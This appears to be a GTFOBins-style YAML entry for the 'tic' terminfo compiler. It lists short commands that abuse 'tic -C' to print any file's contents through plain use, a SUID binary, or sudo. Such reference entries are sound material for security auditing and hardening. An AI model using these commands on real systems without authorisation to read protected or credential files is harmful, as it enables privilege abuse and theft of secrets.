---
description: The tic command translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure, so this may not be suitable to read arbitrary binary data.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        tic -C "$LFILE"
  suid:
    - code: |
        LFILE=file_to_read
        ./tic -C "$LFILE"
  sudo:
    - code: |
        LFILE=file_to_read
        sudo tic -C "$LFILE"
---
